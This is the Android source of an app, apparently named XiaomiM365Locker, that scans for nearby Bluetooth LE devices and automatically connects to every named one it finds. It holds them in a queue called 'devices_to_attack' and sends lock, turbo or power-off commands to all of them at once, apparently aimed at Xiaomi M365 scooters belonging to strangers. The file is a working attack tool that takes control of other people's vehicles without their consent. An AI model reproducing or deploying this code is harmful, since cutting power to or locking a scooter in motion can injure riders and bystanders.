package com.XiaomiM365Locker.app;

import android.Manifest;
import android.bluetooth.BluetoothAdapter;
import android.bluetooth.BluetoothDevice;
import android.bluetooth.BluetoothManager;
import android.bluetooth.le.BluetoothLeScanner;
import android.bluetooth.le.ScanCallback;
import android.bluetooth.le.ScanResult;
import android.content.Context;
import android.support.design.widget.FloatingActionButton;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;

import permissions.dispatcher.NeedsPermission;
import permissions.dispatcher.PermissionUtils;

import android.view.View;
import android.widget.AdapterView;
import android.widget.ListView;

import com.polidea.rxandroidble2.RxBleClient;
import com.polidea.rxandroidble2.RxBleConnection;
import com.polidea.rxandroidble2.RxBleDevice;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.ConcurrentLinkedQueue;

import android.widget.TextView;
import android.widget.Toast;

public class MainActivity extends AppCompatActivity {
    private DeviceAdapter devicesAdapter;
    private BluetoothAdapter mBTAdapter;
    private boolean scanning;
    private HashMap<String, DeviceConnection> devices_connections =  new HashMap<>();
    private RxBleClient rxBleClient;
    private ConcurrentLinkedQueue<String> devices_to_attack = new ConcurrentLinkedQueue<>();
    private TextView tv_scanning_state;
    private static final int REQUEST_STARTSCAN = 0;
    private static final String[] PERMISSION_STARTSCAN = new String[] {"android.permission.ACCESS_COARSE_LOCATION"};
    private Thread attacking_thread = null;
    private BluetoothLeScanner bluetoothLeScanner = null;
    private boolean lock_mode = false;
    private boolean turbo_mode = false;
    private boolean poweroff_mode = false;
    private ListView lv_scan = null;
    private BluetoothManager btManager = null;

    private ScanCallback mLeScanCallback = new ScanCallback() {
        @Override
        public void onScanResult(int callbackType, ScanResult result) {
            super.onScanResult(callbackType, result);

            BluetoothDevice newDevice = result.getDevice();

            int newRssi = result.getRssi();
            String device_name = newDevice.getName();
            String device_address = newDevice.getAddress();
//            if(device_name == null || !device_name.contains("MIScooter"))
            if(device_name == null)
            {
                return;
            }
            DeviceConnection dev = devices_connections.get(device_address);
            if(dev != null) {
                devicesAdapter.update(newDevice, newRssi, dev.getState());
            } else {
                devicesAdapter.update(newDevice, newRssi, RxBleConnection.RxBleConnectionState.DISCONNECTED);
            }

            String mDeviceAddress = newDevice.getAddress();
            add_device_to_attack(mDeviceAddress);
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_devices_activity);

        tv_scanning_state = findViewById(R.id.scannning_state);
        updateStatus();

        if (!PermissionUtils.hasSelfPermissions(this, MainActivity.PERMISSION_STARTSCAN)) {
            ActivityCompat.requestPermissions(this, MainActivity.PERMISSION_STARTSCAN, MainActivity.REQUEST_STARTSCAN);
        }

        this.rxBleClient = RxBleClient.create(getApplicationContext());
        this.scanning = false;
        this.lv_scan = findViewById(R.id.devices_list);
        this.devicesAdapter = new DeviceAdapter(this, R.layout.list_device_item, new ArrayList<Device>());
        lv_scan.setAdapter(this.devicesAdapter);

        this.btManager = (BluetoothManager) this.getSystemService(Context.BLUETOOTH_SERVICE);
        mBTAdapter = btManager.getAdapter();

        bluetoothLeScanner = this.mBTAdapter.getBluetoothLeScanner();


        final Runnable r = new Runnable() {
            public void run() {
                while(true)
                {
                    if(!scanning)
                    {
                        continue;
                    }
                    String address = devices_to_attack.poll();
                    if(address != null)
                    {
                        connect_device(address);
                    }

                    for (Map.Entry<String, DeviceConnection> device_entry: devices_connections.entrySet())
                    {
                        DeviceConnection devconn = device_entry.getValue();
                        if(devconn != null)
                        {
                            if (devconn.get_first_command() != null && devconn.getState() == RxBleConnection.RxBleConnectionState.CONNECTED)
                            {
                                devconn.runNextCommand();
                            }
                        }
                    }
                }
            }
        };
        attacking_thread = new Thread(r);

        attacking_thread.start();

        FloatingActionButton fab_scan = findViewById(R.id.fab_scan);

        fab_scan.setOnClickListener((View onClick) -> {
            if(!scanning)
            {
                startScan();
            }
            else {
                stopScan();
                stopLockMode();
                stopTurboMode();
                stopPowerOffMode();
            }
        });

        FloatingActionButton fab_lock = findViewById(R.id.fab_lock);
        fab_lock.setOnClickListener(OnClickListener -> {
                if(!lock_mode)
                {
                    stopTurboMode();
                    stopPowerOffMode();
                    startLockMode();
                }
                else {
                    stopLockMode();
                }
        });

        FloatingActionButton fab_turbo = findViewById(R.id.fab_turbo);
        fab_turbo.setOnClickListener(onClick -> {
            if(!turbo_mode)
            {
                stopLockMode();
                stopPowerOffMode();
                startTurboMode();
            }
            else {
                stopTurboMode();
            }
        });

        FloatingActionButton fab_power = findViewById(R.id.fab_power);
        fab_power.setOnClickListener(onClick -> {
            if(!poweroff_mode)
            {
                stopLockMode();
                stopTurboMode();
                startPowerOffMode();
            }
            else {
                stopPowerOffMode();
            }
        });

        lv_scan.setOnItemClickListener(new AdapterView.OnItemClickListener() {
            @Override
            public void onItemClick(AdapterView<?> adapterView, View view, int i, long l) {
                Device device = devicesAdapter.getItem(i);
                DeviceConnection connection_device = devices_connections.get(device.getDevice().getAddress());

                if(connection_device != null) {
                    if(lock_mode) {
                        connection_device.addCommand(new LockOn());
                    }

                    if(turbo_mode) {
                        connection_device.addCommand(new TurboOn());
                    }

                    if(poweroff_mode) {
                        connection_device.addCommand(new PowerOff());
                    }
                }
            }
        });
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        stopScan();
    }


    private void add_device_to_attack(String device_address)
    {
        if(this.devices_connections.get(device_address) != null)
        {
            return;
        }
        this.devices_to_attack.add(device_address);
    }


    private void lock_device(String device_address)
    {

        if (this.devices_connections.get(device_address) == null) {
            return;
        }

        DeviceConnection device = this.devices_connections.get(device_address);
        device.addCommand(new LockOn());

    }

    private void poweroff_device(String device_address)
    {

        if (this.devices_connections.get(device_address) == null) {
            return;
        }

        DeviceConnection device = this.devices_connections.get(device_address);
        device.addCommand(new PowerOff());

    }

    private void turbo_device(String device_address)
    {

        if (this.devices_connections.get(device_address) == null) {
            return;
        }

        DeviceConnection device = this.devices_connections.get(device_address);
        device.addCommand(new TurboOn());

    }

    private void connect_device(String device_address)
    {
        if (this.devices_connections.get(device_address) != null) {
            return;
        }

        RxBleDevice bleDevice =  this.rxBleClient.getBleDevice(device_address);
        DeviceConnection device = new DeviceConnection(bleDevice, this.devicesAdapter,
                this);

        this.devices_connections.put(device_address, device);

        if(this.lock_mode)
            lock_device(device_address);

        if(this.turbo_mode)
            turbo_device(device_address);

        if (this.poweroff_mode)
            poweroff_device(device_address);


    }

    @NeedsPermission(Manifest.permission.ACCESS_COARSE_LOCATION)
    void startScan()
    {
        this.scanning = true;
        if (this.mBTAdapter != null) {

            RxBleClient client = this.rxBleClient;
            RxBleClient.State state = client.getState();

            if(state == RxBleClient.State.READY) {

                bluetoothLeScanner.startScan(this.mLeScanCallback);
            } else {
                Toast.makeText(this, "Enable bluetooth", Toast.LENGTH_LONG).show();
                stopScan();
            }

        }

        this.updateStatus();
    }

    private void updateStatus()
    {
        String state = "Scanning:" + this.scanning
                + " || PowerOff:" + this.poweroff_mode
                + " || Lock:" + this.lock_mode
                + " || Turbo:" + this.turbo_mode;

        tv_scanning_state.setText(state);
    }

    private void startLockMode() {
        this.lock_mode = true;

        for (Map.Entry<String, DeviceConnection> device_entry: this.devices_connections.entrySet())
        {
            device_entry.getValue().addCommand(new LockOn());
        }
        this.updateStatus();
    }

    private void stopLockMode() {
        this.lock_mode = false;

        this.updateStatus();
    }

    private void startTurboMode() {
        this.turbo_mode = true;

        for (Map.Entry<String, DeviceConnection> device_entry: this.devices_connections.entrySet())
        {
            device_entry.getValue().addCommand(new TurboOn());
        }
        this.updateStatus();
    }

    private void stopTurboMode() {
        this.turbo_mode = false;

        this.updateStatus();
    }

    private void startPowerOffMode() {
        this.poweroff_mode = true;

        for (Map.Entry<String, DeviceConnection> device_entry: this.devices_connections.entrySet())
        {
            device_entry.getValue().addCommand(new PowerOff());
        }
        this.updateStatus();
    }

    private void stopPowerOffMode() {
        this.poweroff_mode = false;

        this.updateStatus();
    }

    private void stopScan() {
        for (Map.Entry<String, DeviceConnection> device_entry: this.devices_connections.entrySet())
        {
            device_entry.getValue().dispose();
        }
        bluetoothLeScanner.stopScan(this.mLeScanCallback);

        this.rxBleClient = RxBleClient.create(getApplicationContext());
        this.devicesAdapter = new DeviceAdapter(this, R.layout.list_device_item, new ArrayList<>());
        this.lv_scan.setAdapter(this.devicesAdapter);


        this.btManager= (BluetoothManager) this.getSystemService(Context.BLUETOOTH_SERVICE);
        mBTAdapter = this.btManager.getAdapter();

        bluetoothLeScanner = this.mBTAdapter.getBluetoothLeScanner();


        this.devices_connections = new HashMap<>();
        this.devices_to_attack = new ConcurrentLinkedQueue<>();
        this.scanning = false;
        this.updateStatus();

        this.devicesAdapter.notifyDataSetChanged();
    }


}
